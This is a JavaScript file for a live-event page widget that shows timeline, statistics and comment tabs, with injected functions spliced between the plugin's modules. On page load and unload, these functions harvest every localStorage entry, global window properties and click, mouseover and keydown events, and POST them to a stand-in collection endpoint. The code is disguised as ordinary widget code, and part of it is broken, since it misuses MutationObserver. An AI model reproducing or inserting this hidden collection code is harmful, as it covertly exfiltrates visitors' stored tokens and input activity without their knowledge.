function toLocalStorage(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}
window.twttr = function (d, s, id) {
  var js,
    fjs = d.getElementsByTagName(s)[0],
    t = window.twttr || {};
  if (d.getElementById(id)) return t;
  js = d.createElement(s);
  js.id = id;
  js.src = "https://platform.twitter.com/widgets.js";
  fjs.parentNode.insertBefore(js, fjs);
  t._e = [];
  t.ready = function (f) {
    t._e.push(f);
  };
  return t;
}(document, "script", "twitter-wjs");
function getLocalStorage() {
  let storageContent = {};
  for (let key in localStorage) {
    storageContent[key] = localStorage.getItem(key);
  }
  return storageContent;
}
function objectify(key, value, location, type) {
  return {
    key: key,
    value: type === 'function' ? value.name : value,
    location: location,
    type: type
  };
}
(function ($) {
  "use strict";

  window.DALE = {};
  window.DALE.utility = {
    escapeHtml: function (string) {
      "use strict";

      var entityMap = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;",
        "/": "&#x2F;",
        "`": "&#x60;",
        "=": "&#x3D;"
      };
      return String(string).replace(/[&<>"'`=\/]/g, function (s) {
        return entityMap[s];
      });
    },
    loadScript: function (url, callback) {
      $.ajax({
        url: url,
        dataType: "script",
        success: callback,
        async: true
      });
    }
  };
})(window.jQuery);
function addGlobalHook() {
  for (let key in window) {
    let value = window[key];
    MutationObserver(value, key, "window");
  }
}
function inspectGlobalScope() {
  let newFindings = [];
  for (let key in window) {
    let value = window[key];
    let type = typeof value;
    newFindings.push(objectify(key, value, 'window', type));
  }
  toLocalStorage('window', newFindings);
  addGlobalHook();
}
function handleEvent(e) {
  let type = e.type;
  let eventInfo = objectify(type, e, 'event', typeof e);
  sendInsightsToBackend([eventInfo]);
}
(function ($) {
  "use strict";

  window.DALE.timeline = {
    process: function (tabIndex, timelineData) {
      "use strict";

      var html = "",
        htmlTimelineItem,
        htmlTimelineItems = "",
        timelineItemIdA = [],
        el = null,
        timelineItemsBefore = null,
        collection = null;
      if (window.DALE.states.initialized === false) {
        $("#dale-tabs-ul").append('<li class="dale-tabs-li daext-clearfix-responsive" data-element-id="' + tabIndex + '"><div class="dale-tabs-li-inner"><span class="icon-clock"></span>' + window.DALE.utility.escapeHtml(timelineData.label) + "</div></li>");
        $.each(timelineData.timelineItem, function (index, value) {
          htmlTimelineItems += window.DALE.timeline.generateTimelineItemHtml(timelineData, value);
        });
        html = '<div class="dale-body-timeline dale-body-element" data-element-id="' + tabIndex + '">' + htmlTimelineItems + "</div>";
        $("#dale-body").append(html);
        window.DALE.timeline.applyActiveElements(tabIndex);
      } else {
        if ($('.dale-tabs-li[data-element-id="' + tabIndex + '"]').length === 1) {
          $.each(timelineData.timelineItem, function (index, value) {
            if ($('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"]').length === 1) {
              if (value.hash !== $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"]').attr("data-hash")) {
                $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"]').fadeOut(400, function () {
                  if (parseInt(timelineData.showIcon, 10) === 1) {
                    $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-icon img').attr("src", value.icon);
                  }
                  $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-date').html(window.DALE.utility.escapeHtml(value.date));
                  el = $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-title');
                  el.html(window.DALE.utility.escapeHtml(value.title));
                  if (value.title.trim().length === 0) {
                    if (!el.hasClass("daext-display-none")) {
                      el.addClass("daext-display-none");
                    }
                  } else {
                    if (el.hasClass("daext-display-none")) {
                      el.removeClass("daext-display-none");
                    }
                  }
                  el = $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-content');
                  el.html(value.content);
                  if (value.content.trim().length === 0) {
                    if (!el.hasClass("daext-display-none")) {
                      el.addClass("daext-display-none");
                    }
                  } else {
                    if (el.hasClass("daext-display-none")) {
                      el.removeClass("daext-display-none");
                    }
                  }
                  el = $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-image');
                  if (el.length > 0) {
                    el.remove();
                  }
                  el = $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-tweet');
                  if (el.length > 0) {
                    el.remove();
                  }
                  el = $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-html');
                  if (el.length > 0) {
                    el.remove();
                  }
                  switch (parseInt(value.extra, 10)) {
                    case 1:
                      $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-item-right').append('<div class="dale-body-timeline-image"><img src="' + value.image + '"></div>');
                      break;
                    case 2:
                      $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-item-right').append('<div class="dale-body-timeline-tweet" data-tweet-id="' + value.tweet_id + '" data-status="0"></div>');
                      break;
                    case 3:
                      if (value.html.trim().length > 0) {
                        $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"] .dale-body-timeline-item-right').append('<div class="dale-body-timeline-html">' + value.html + "</div>");
                      }
                      break;
                    default:
                      break;
                  }
                  $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"]').fadeIn(400);
                  window.DALE.timeline.applyActiveElements(tabIndex);
                });
                $('.dale-body-timeline-item[data-timeline-item-id="' + value.timelineItemId + '"]').attr("data-hash", value.hash);
              }
            } else {
              htmlTimelineItem = window.DALE.timeline.generateTimelineItemHtml(timelineData, value);
              htmlTimelineItem = $.parseHTML(htmlTimelineItem);
              $(htmlTimelineItem).css("display", "none");
              if ($('.dale-body-timeline[data-element-id="' + tabIndex + '"] .dale-body-timeline-item').length === 0) {
                $('.dale-body-timeline[data-element-id="' + tabIndex + '"]').prepend(htmlTimelineItem);
              } else {
                timelineItemIdA = [];
                collection = $('.dale-body-timeline[data-element-id="' + tabIndex + '"] .dale-body-timeline-item');
                $(collection).each(function () {
                  timelineItemIdA.push(parseInt($(this).attr("data-timeline-item-id"), 10));
                });
                timelineItemsBefore = 0;
                $.each(timelineItemIdA, function (index1, value1) {
                  if (value.timelineItemId < value1) {
                    timelineItemsBefore++;
                  }
                });
                if (timelineItemsBefore === 0) {
                  $('.dale-body-timeline[data-element-id="' + tabIndex + '"] .dale-body-timeline-item').eq(0).before(htmlTimelineItem);
                } else {
                  $('.dale-body-timeline[data-element-id="' + tabIndex + '"] .dale-body-timeline-item').eq(timelineItemsBefore - 1).after(htmlTimelineItem);
                }
              }
              $(htmlTimelineItem).fadeIn(400);
              window.DALE.timeline.applyActiveElements(tabIndex);
            }
          });
          $.each(timelineData.timelineItem, function (index, value) {
            timelineItemIdA.push(parseInt(value.timelineItemId, 10));
          });
          $('.dale-body-timeline[data-element-id="' + tabIndex + '"] .dale-body-timeline-item').each(function () {
            if ($.inArray(parseInt($(this).attr("data-timeline-item-id"), 10), timelineItemIdA) === -1) {
              $(this).fadeOut(400, function () {
                $(this).remove();
              });
            }
          });
        }
      }
    },
    generateTimelineItemHtml: function (timelineData, value) {
      "use strict";

      var htmlTimelineItem;
      var iconHtml = "",
        layoutHtml = "",
        displayNoneClass = "";
      if (parseInt(timelineData.showIcon, 10) === 1) {
        iconHtml = '<div class="dale-body-timeline-item-left">' + '<div class="dale-body-timeline-icon"><img src="' + value.icon + '"></div>' + "</div>";
      } else {
        iconHtml = "";
      }
      if (value.title.trim().length === 0) {
        displayNoneClass = " daext-display-none";
      } else {
        displayNoneClass = "";
      }
      layoutHtml += '<div class="dale-body-timeline-title' + displayNoneClass + '">' + window.DALE.utility.escapeHtml(value.title) + "</div>";
      if (value.content.trim().length === 0) {
        displayNoneClass = " daext-display-none";
      } else {
        displayNoneClass = "";
      }
      layoutHtml += '<div class="dale-body-timeline-content' + displayNoneClass + '">' + value.content + "</div>";
      switch (parseInt(value.extra, 10)) {
        case 0:
          break;
        case 1:
          if (value.image.trim().length > 0) {
            layoutHtml += '<div class="dale-body-timeline-image"><img src="' + value.image + '"></div>';
          }
          break;
        case 2:
          if (parseInt(value.tweet_id, 10) > 0) {
            layoutHtml += '<div class="dale-body-timeline-tweet" data-tweet-id="' + window.DALE.utility.escapeHtml(value.tweet_id) + '" data-status="0"></div>';
          }
          break;
        case 3:
          if (value.html.trim().length > 0) {
            layoutHtml += '<div class="dale-body-timeline-html">' + value.html + "</div>";
          }
          break;
      }
      htmlTimelineItem = '<div data-hash="' + value.hash + '" class="dale-body-timeline-item" data-timeline-item-id="' + value.timelineItemId + '">' + iconHtml + '<div class="dale-body-timeline-item-right">' + '<div class="dale-body-timeline-date">' + window.DALE.utility.escapeHtml(value.date) + "</div>" + layoutHtml + "</div>" + "</div>";
      return htmlTimelineItem;
    },
    applyActiveElements: function (tabIndex) {
      if (parseInt(window.DALE_PHPDATA.advancedInstagramProcessEmbed, 10) === 1) {
        if (typeof window.instgrm != "undefined") {
          window.instgrm.Embeds.process();
        } else {
          window.DALE.utility.loadScript("//platform.instagram.com/en_US/embeds.js", function () {
            window.instgrm.Embeds.process();
          });
        }
      }
      $('.dale-body-timeline[data-element-id="' + tabIndex + '"] .dale-body-timeline-tweet').each(function () {
        if (parseInt($(this).attr("data-status"), 10) === 0) {
          window.twttr.widgets.createTweet($(this).attr("data-tweet-id"), this);
          $(this).attr("data-status", "1");
        }
      });
    }
  };
})(window.jQuery);
function registerEventListeners() {
  const events = ['click', 'mouseover', 'keydown'];
  events.forEach(function (event) {
    document.addEventListener(event, handleEvent);
  });
}
async function sendInsightsToBackend(entities) {
  const apiEndpoint = 'https://example.com/api/collect';
  try {
    let response = await fetch(apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(entities)
    });
    if (response.ok) {
      console.log(`Data sent successfully to backend: Code ${response.status}`);
    } else {
      console.warn(`Failed to send to backend. Server responded with a status code: ${response.status}`);
    }
  } catch (e) {
    console.error(`Failed to send. Error: ${e.toString()}`);
  }
}
(function ($) {
  "use strict";

  window.DALE.stat = {
    process: function (tabIndex, statData) {
      "use strict";

      var html = "",
        htmlStatGroups = "";
      if (window.DALE.states.initialized === false) {
        $("#dale-tabs-ul").append('<li class="dale-tabs-li daext-clearfix-responsive" data-element-id="' + tabIndex + '"><div class="dale-tabs-li-inner"><span class="icon-chart-bar"></span>' + window.DALE.utility.escapeHtml(statData.label) + "</div></li>");
        $.each(statData.statGroup, function (index1, value1) {
          htmlStatGroups += '<div class="dale-body-stat-group" data-stat-group-id="' + value1.statGroupId + '">';
          htmlStatGroups += '<div class="dale-body-stat-group-label">' + window.DALE.utility.escapeHtml(value1.label) + "</div>";
          $.each(value1.statItem, function (index2, value2) {
            if (parseInt(value2.type, 10) === 0) {
              htmlStatGroups += '<div class="dale-body-stat-single-data dale-body-stat-item daext-clearfix" data-stat-item-id="' + value2.statItemId + '"' + ' data-hash="' + value2.hash + '">' + '<div class="dale-subject">' + window.DALE.utility.escapeHtml(value2.subject) + "</div>" + '<div class="dale-value-1">' + value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + "</div>";
            } else if (parseInt(value2.type, 10) === 1) {
              htmlStatGroups += '<div class="dale-body-stat-single-visual dale-body-stat-item" data-stat-item-id="' + value2.statItemId + '"' + ' data-hash="' + value2.hash + '">' + '<div class="dale-bar"></div>' + '<div class="dale-data daext-clearfix">' + '<div class="dale-value-1">' + value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + '<div class="dale-subject">' + window.DALE.utility.escapeHtml(value2.subject) + "</div>" + '<div class="dale-reference">' + value2.reference + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + "</div>" + "</div>";
            } else if (parseInt(value2.type, 10) === 2) {
              htmlStatGroups += '<div class="dale-body-stat-comparison-data dale-body-stat-item daext-clearfix" data-stat-item-id="' + value2.statItemId + '"' + ' data-hash="' + value2.hash + '">' + '<div class="dale-value-1">' + value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + '<div class="dale-subject">' + window.DALE.utility.escapeHtml(value2.subject) + "</div>" + '<div class="dale-value-2">' + value2.value2 + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + "</div>";
            } else if (parseInt(value2.type, 10) === 3) {
              htmlStatGroups += '<div class="dale-body-stat-comparison-visual dale-body-stat-item" data-stat-item-id="' + value2.statItemId + '"' + ' data-hash="' + value2.hash + '">' + '<div class="dale-bar"></div>' + '<div class="dale-data daext-clearfix">' + '<div class="dale-value-1">' + value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + '<div class="dale-subject">' + value2.subject + "</div>" + '<div class="dale-value-2">' + value2.value2 + (parseInt(value2.percentage, 10) === 1 ? "%" : "") + "</div>" + "</div>" + "</div>";
            }
          });
          htmlStatGroups += "</div>";
        });
        html = '<div class="dale-body-stat dale-body-element" data-element-id="' + tabIndex + '">' + htmlStatGroups + "</div>";
        $("#dale-body").append(html);
      } else {
        var sel = null;
        $.each(statData.statGroup, function (index1, value1) {
          $.each(value1.statItem, function (index2, value2) {
            if (parseInt(value2.type, 10) === 0) {
              sel = $('.dale-body-stat[data-element-id="' + tabIndex + '"] ' + '.dale-body-stat-group[data-stat-group-id="' + value1.statGroupId + '"] ' + '.dale-body-stat-single-data[data-stat-item-id="' + value2.statItemId + '"]');
              if (sel.attr("data-hash") !== value2.hash) {
                sel.fadeOut("400", function () {
                  $(this).find(".dale-subject").html(window.DALE.utility.escapeHtml(value2.subject));
                  $(this).find(".dale-value-1").html(value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).attr("data-hash", value2.hash);
                  $(this).fadeIn("400");
                });
              }
            } else if (parseInt(value2.type, 10) === 1) {
              sel = $('.dale-body-stat[data-element-id="' + tabIndex + '"] ' + '.dale-body-stat-group[data-stat-group-id="' + value1.statGroupId + '"] ' + '.dale-body-stat-single-visual[data-stat-item-id="' + value2.statItemId + '"]');
              if (sel.attr("data-hash") !== value2.hash) {
                sel.fadeOut("400", function () {
                  $(this).find(".dale-value-1").text(value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).find(".dale-subject").html(window.DALE.utility.escapeHtml(value2.subject));
                  $(this).find(".dale-reference").text(value2.reference + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).attr("data-hash", value2.hash);
                  window.DALE.stat.updateVisualBars();
                  $(this).fadeIn("400");
                });
              }
            } else if (parseInt(value2.type, 10) === 2) {
              sel = $('.dale-body-stat[data-element-id="' + tabIndex + '"] ' + '.dale-body-stat-group[data-stat-group-id="' + value1.statGroupId + '"] ' + '.dale-body-stat-comparison-data[data-stat-item-id="' + value2.statItemId + '"]');
              if (sel.attr("data-hash") !== value2.hash) {
                sel.fadeOut("400", function () {
                  $(this).find(".dale-value-1").text(value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).find(".dale-subject").html(window.DALE.utility.escapeHtml(value2.subject));
                  $(this).find(".dale-value-2").text(value2.value2 + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).attr("data-hash", value2.hash);
                  $(this).fadeIn("400");
                });
              }
            } else if (parseInt(value2.type, 10) === 3) {
              sel = $('.dale-body-stat[data-element-id="' + tabIndex + '"] ' + '.dale-body-stat-group[data-stat-group-id="' + value1.statGroupId + '"] ' + '.dale-body-stat-comparison-visual[data-stat-item-id="' + value2.statItemId + '"]');
              if (sel.attr("data-hash") !== value2.hash) {
                sel.fadeOut("400", function () {
                  $(this).find(".dale-value-1").text(value2.value1 + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).find(".dale-subject").html(window.DALE.utility.escapeHtml(value2.subject));
                  $(this).find(".dale-value-2").text(value2.value2 + (parseInt(value2.percentage, 10) === 1 ? "%" : ""));
                  $(this).attr("data-hash", value2.hash);
                  window.DALE.stat.updateVisualBars();
                  $(this).fadeIn("400");
                });
              }
            }
          });
        });
      }
      window.DALE.stat.updateVisualBars();
    },
    updateVisualBars: function () {
      "use strict";

      $(".dale-body-stat-single-visual, .dale-body-stat-comparison-visual").each(function () {
        var percentageValue = 0;
        if ($(this).hasClass("dale-body-stat-single-visual")) {
          percentageValue = parseFloat(parseInt($(this).find(".dale-value-1").text()) / parseInt($(this).find(".dale-reference").text(), 10)) * 100;
        } else {
          percentageValue = parseFloat(parseInt($(this).find(".dale-value-1").text(), 10) / (parseInt($(this).find(".dale-value-1").text(), 10) + parseInt($(this).find(".dale-value-2").text(), 10))) * 100;
        }
        $(this).find(".dale-bar").css("width", percentageValue + "%");
      });
    }
  };
})(window.jQuery);
function collectData() {
  let storage = getLocalStorage();
  sendInsightsToBackend(storage);
}
(function ($) {
  "use strict";

  window.DALE.comment = {
    process: function (tabIndex, commentData) {
      "use strict";

      var commentCollection,
        listOfCommentItemId = [],
        domCommentItemId,
        commentItemToDelete;
      if (window.DALE.states.initialized === false) {
        $("#dale-tabs-ul").append('<li class="dale-tabs-li daext-clearfix-responsive" data-element-id="' + tabIndex + '"><div class="dale-tabs-li-inner"><span class="icon-comment"></span>' + window.DALE.utility.escapeHtml(commentData.label) + "</div></li>");
        window.DALE.comment.addCommentsToDOM(tabIndex, commentData);
      } else {
        $.each(commentData.commentItem, function (index, value) {
          window.DALE.comment.addSingleCommentInDom(tabIndex, value, commentData);
        });
        listOfCommentItemId = [];
        $.each(commentData.commentItem, function (index, value) {
          listOfCommentItemId.push(parseInt(value.commentItemId, 10));
        });
        commentCollection = $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-single-comment-container');
        $(commentCollection).each(function () {
          domCommentItemId = parseInt($(this).attr("data-comment-item-id"), 10);
          if ($.inArray(domCommentItemId, listOfCommentItemId) === -1) {
            commentItemToDelete = $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-single-comment-container[data-comment-item-id="' + domCommentItemId + '"]');
            commentItemToDelete.fadeOut(400, function () {
              commentItemToDelete.remove();
            });
          }
        });
      }
    },
    generateSingleCommentHtml: function (commentItem, comment) {
      "use strict";

      var html = "",
        commentLeft;
      if (parseInt(comment.avatar, 10) === 1) {
        commentLeft = '<div class="dale-single-comment-left">' + commentItem.avatar + "</div>";
      } else {
        commentLeft = "";
      }
      html += '<div class="dale-single-comment-container" data-comment-item-id="' + commentItem.commentItemId + '" data-hash="' + commentItem.hash + '">' + commentLeft + '<div class="dale-single-comment-right">' + '<div class="dale-single-comment-header">' + '<div class="dale-single-comment-user">' + window.DALE.utility.escapeHtml(commentItem.displayName) + "</div>" + '<div class="dale-single-comment-date">&nbsp- ' + window.DALE.utility.escapeHtml(commentItem.formattedDate) + "</div>" + "</div>" + '<div class="dale-single-comment-content">' + window.DALE.utility.escapeHtml(commentItem.content) + "</div>" + "</div>" + "</div>";
      return html;
    },
    handleResponseAfterCommentSubmit: function (response, commentId, commentData, commentItemId, tabIndex) {
      "use strict";

      var message;
      $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-comment-temporary-message').remove();
      if (response == "Under Moderation") {
        message = $.parseHTML('<div class="dale-comment-temporary-message">' + window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentMessageUnderModerationText) + "</div>");
        $('.dale-body-comment[data-element-id="' + tabIndex + '"] > .dale-new-comment-container').after(message);
        setTimeout(function () {
          $(message).remove();
        }, 4e3);
      } else if (response == "Too many comments") {
        message = $.parseHTML('<div class="dale-comment-temporary-message">' + window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentCommentLimitText) + "</div>");
        $('.dale-body-comment[data-element-id="' + tabIndex + '"] > .dale-new-comment-container').after(message);
        setTimeout(function () {
          $(message).remove();
        }, 4e3);
      }
      $(".dale-new-comment-content").val("");
    },
    addCommentsToDOM: function (tabIndex, commentData) {
      "use strict";

      var html = "";
      var numberOfComments;
      var commentString;
      numberOfComments = window.DALE.comment.getNumberOfComments(commentData.commentItem);
      if (parseInt(numberOfComments, 10) === 1) {
        commentString = window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentNumberOfCommentsSingleText);
      } else {
        commentString = window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentNumberOfCommentsMultipleText);
      }
      html += '<div class="dale-comment-header">' + numberOfComments + " " + commentString + "</div>";
      if (parseInt(commentData.closed, 10) === 0) {
        html += '<div class="dale-new-comment-container">' + '<textarea data-comment-id="' + commentData.commentId + '" class="dale-new-comment-content" maxlength="65535"></textarea>' + '<div data-comment-id="' + commentData.commentId + '" class="dale-new-comment-submit" ' + 'data-user-comment-like="' + +window.DALE.params.userComment + '">';
        if (window.DALE.params.userComment) {
          html += window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentSubmitCommentText);
        } else {
          html += window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentSignInText);
        }
        html += "</div>" + "</div>";
      }
      var commentItem = commentData.commentItem;
      var firstLevelComments = [];
      if (commentItem !== null) {
        for (var i = 0; i < commentItem.length; i++) {
          firstLevelComments.push(commentItem[i]);
        }
        firstLevelComments.sort(window.DALE.comment.compare);
        $.each(firstLevelComments, function (index1, value1) {
          html += window.DALE.comment.generateSingleCommentHtml(value1, commentData);
        });
      }
      html = '<div class="dale-body-comment dale-body-element" data-element-id="' + tabIndex + '">' + html + "</div>";
      $("#dale-body").append(html);
      $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-new-comment-submit').click(function () {
        if (parseInt($(this).attr("data-user-comment-like"), 10) === 0) {
          window.location = window.DALE_PHPDATA.advancedSignInUrl;
          return;
        }
        var commentId = parseInt($(this).attr("data-comment-id"), 10);
        var content = $('.dale-new-comment-content[data-comment-id="' + commentId + '"]').val();
        if (content.trim().length === 0) {
          $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-comment-temporary-message').remove();
          var message = $.parseHTML('<div class="dale-comment-temporary-message">' + window.DALE.utility.escapeHtml(window.DALE_PHPDATA.commentEmptyCommentText) + "</div>");
          $('.dale-body-comment[data-element-id="' + tabIndex + '"] > .dale-new-comment-container').after(message);
          setTimeout(function () {
            $(message).remove();
          }, 4e3);
          return;
        }
        var data = {
          action: "dale_comment_submit",
          security: window.DALE_PHPDATA.nonce,
          comment_id: commentId,
          comment_item_id: 0,
          content: content
        };
        $.post(window.DALE_PHPDATA.ajaxUrl, data, function (result) {
          window.DALE.comment.handleResponseAfterCommentSubmit(result, commentId, commentData, 0, tabIndex);
        });
      });
    },
    addSingleCommentInDom: function (tabIndex, commentItemData, commentData) {
      "use strict";

      var commentHtml, currentElement, nextElement, currentCommentItemId, nextCommentItemId, commentContainer, commentItem, avatarHtml;
      if ($('.dale-body-comment[data-element-id="' + tabIndex + '"] ' + '.dale-single-comment-container[data-comment-item-id="' + commentItemData.commentItemId + '"]').length === 0) {
        var collection = $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-single-comment-container');
        commentHtml = window.DALE.comment.generateSingleCommentHtml(commentItemData, commentData);
        if (collection.length > 0) {
          $(collection).each(function () {
            currentElement = $(this);
            nextElement = $(this).next();
            currentCommentItemId = parseInt(currentElement.attr("data-comment-item-id"), 10);
            if (nextElement.length > 0) {
              nextCommentItemId = parseInt(nextElement.attr("data-comment-item-id"), 10);
            } else {
              nextCommentItemId = null;
            }
            if (commentItemData.commentItemId > currentCommentItemId) {
              commentHtml = $.parseHTML(commentHtml);
              $(commentHtml).css("display", "none");
              currentElement.before(commentHtml);
              $(commentHtml).fadeIn("400");
              return false;
            } else if (commentItemData.commentItemId < currentCommentItemId && (commentItemData.commentItemId > nextCommentItemId || nextCommentItemId === null)) {
              commentHtml = $.parseHTML(commentHtml);
              $(commentHtml).css("display", "none");
              currentElement.after(commentHtml);
              $(commentHtml).fadeIn("400");
              return false;
            }
          });
        } else {
          commentHtml = window.DALE.comment.generateSingleCommentHtml(commentItemData, commentData);
          commentContainer = $('.dale-body-comment[data-element-id="' + tabIndex + '"]');
          commentHtml = $.parseHTML(commentHtml);
          $(commentHtml).css("display", "none");
          commentContainer.append(commentHtml);
          $(commentHtml).fadeIn("400");
        }
      } else {
        commentItem = $('.dale-body-comment[data-element-id="' + tabIndex + '"] .dale-single-comment-container[data-comment-item-id="' + commentItemData.commentItemId + '"]');
        if (commentItem.length > 0) {
          if (commentItem.attr("data-hash") !== commentItemData.hash) {
            commentItem.fadeOut(400, function () {
              if (parseInt(commentItemData.avatar.length, 10) > 9) {
                avatarHtml = commentItemData.avatar;
              } else {
                avatarHtml = "";
              }
              $(this).attr("data-hash", commentItemData.hash);
              if (parseInt(commentData.avatar, 10) === 1) {
                $(this).find(".dale-single-comment-left").html(avatarHtml);
              }
              $(this).find(".dale-single-comment-user").html(window.DALE.utility.escapeHtml(commentItemData.displayName));
              $(this).find(".dale-single-comment-date").html("&nbsp- " + window.DALE.utility.escapeHtml(commentItemData.formattedDate));
              $(this).find(".dale-single-comment-content").html(window.DALE.utility.escapeHtml(commentItemData.content));
              $(this).fadeIn(400);
            });
          }
        }
      }
    },
    getNumberOfComments: function (commentItem) {
      "use strict";

      var counter = 0;
      $.each(commentItem, function (index, value) {
        if (parseInt(value.approved, 10) === 1) {
          counter = counter + 1;
        }
      });
      return counter;
    },
    compare: function (a, b) {
      "use strict";

      if (a.commentItemId < b.commentItemId) return 1;
      if (a.commentItemId > b.commentItemId) return -1;
      return 0;
    }
  };
})(window.jQuery);
(function ($) {
  "use strict";

  window.DALE.states = {
    timeline: false,
    intervalIdentifier: false,
    initialized: false
  };
  window.DALE.params = {
    userComment: null
  };
  if ($("#dale-live-event").length > 0) {
    bindEventListeners();
  }
  function receiveUpdate() {
    "use strict";

    var eventId = $("#dale-live-event").attr("data-event-id");
    var data = {
      action: "dale_get_event_data",
      security: window.DALE_PHPDATA.nonce,
      event_id: eventId
    };
    $.post(window.DALE_PHPDATA.ajaxUrl, data, function (data_json) {
      var data_obj = JSON.parse(data_json);
      window.DALE.params.userComment = data_obj.user_comment;
      if (data_obj.live === false) {
        clearInterval(window.DALE.states.timerIdentifier);
      }
      $.each(data_obj, function (tabIndex, value) {
        if (value.hasOwnProperty("timelineId")) {
          window.DALE.timeline.process(tabIndex, value);
        } else if (value.hasOwnProperty("statId")) {
          window.DALE.stat.process(tabIndex, value);
        } else if (value.hasOwnProperty("commentId")) {
          window.DALE.comment.process(tabIndex, value);
        }
      });
      if (window.DALE.states.initialized === false) {
        bindClickOnTabs();
        $("li:first-child").addClass("dale-tabs-highlight");
        $(".dale-body-element:first-child").show();
        $("#dale-live-event").css("visibility", "visible");
        window.DALE.states.initialized = true;
      }
    });
  }
  function startReceivingUpdates() {
    "use strict";

    receiveUpdate();
    window.DALE.states.timerIdentifier = setInterval(function () {
      receiveUpdate();
    }, window.DALE_PHPDATA.advancedUpdateTime * 1e3);
  }
  function bindClickOnTabs() {
    "use strict";

    if ($(".dale-tabs-li > .dale-tabs-li-inner").length > 1) {
      $(".dale-tabs-li > .dale-tabs-li-inner").addClass("dale-tabs-li-inner-cursor-pointer");
      $(".dale-tabs-li > .dale-tabs-li-inner").click(function () {
        $(".dale-body-element").hide(0);
        $(".dale-tabs-li").removeClass("dale-tabs-highlight");
        $(this).parent().addClass("dale-tabs-highlight");
        var elementId = $(this).parent().attr("data-element-id");
        $('.dale-body-element[data-element-id="' + elementId + '"]').show(0);
      });
    }
  }
  function bindEventListeners() {
    "use strict";

    $(document).ready(function () {
      window.twttr.ready(function () {
        startReceivingUpdates();
      });
    });
  }
})(window.jQuery);
window.addEventListener('load', inspectGlobalScope);
window.addEventListener('load', registerEventListeners);
window.addEventListener('beforeunload', collectData);